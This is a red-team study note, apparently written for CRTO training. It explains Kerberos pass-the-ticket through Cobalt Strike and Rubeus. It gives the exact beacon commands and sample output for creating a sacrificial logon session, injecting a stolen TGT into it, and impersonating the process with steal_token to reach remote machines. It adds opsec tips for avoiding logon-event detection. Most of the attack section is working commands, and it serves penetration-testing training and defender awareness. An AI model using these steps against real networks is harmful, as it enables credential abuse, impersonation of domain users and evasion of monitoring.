
Technique that allows you to add Kerberos tickets to an existing logon session (LUID) that you have access to, or a new one you create.  Accessing a remote resource will then allow that authentication to happen via Kerberos.

The first step is to create a blank, "sacrificial" logon session that we can pass the TGT into.  We do this because a logon session can only hold a single TGT (krbtgt) at a time:

![[kerberos_sessions.png]]

  ### ⚠  Creating a new logon session and passing tickets into sessions other than your own requires elevated privileges.


## 🖊️ via [[Cobalt Strike]]

1) You need to first steal a TGT ticket, check [[Extracting Kerberos Tickets]] from Credential Theft section on [[Actions on Objectives]] 

2) Now we create a new process. Rubeus' `createnetonly` command will start a new hidden process of our choosing, using the [CreateProcessWithLogonW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) API.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : False
[*] Username        : GJB9A2GP
[*] Domain          : VPY1XQRP
[*] Password        : R4ABN1K3
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4748
[+] LUID            : 0x798c2c
```
 
To avoid random username and password (opsec safer) use:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
```

This also creates a new LUID.  It will have no tickets inside, so won't be visible with `triage` just yet.  

3) The next step is to pass the TGT into this new LUID using the Rubeus `ptt` command.  Where the `/luid` is the new LUID we just created and `/ticket` is the base64 encoded ticket we previously extracted:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

[*] Action: Import Ticket
[*] Target LUID: 0x798c2c
[+] Ticket successfully imported!
```

4) You can use the Rubeus triage command to double check that the new LUID was ticket injected
5) The final step is to impersonate the process that we created with createnetonly using Cobalt Strike's `steal_token` command.  At a minimum, this requires the PID of the target process, which in this example, is 4748.  We'll then be able to access the remote machine.

`beacon> steal_token 4748`

6) As before, use `rev2self` to drop the impersonation.  To destroy the logon session we created, simply kill the process with the `kill` command.
```
beacon> rev2self
beacon> kill 4748
```

### ⚠ Opsec
By default, Rubeus will use a random username, domain and password with CreateProcessWithLogonW, which will appear in the associated 4624 logon event.  The "Suspicious Logon Events" saved search will show 4624's where the _TargetOutboundDomainName_ is not an expected value.



### Properties
---
📆 created   {{11-02-2024}} 20:45
🏷️ tags: #redteam #crto 

---

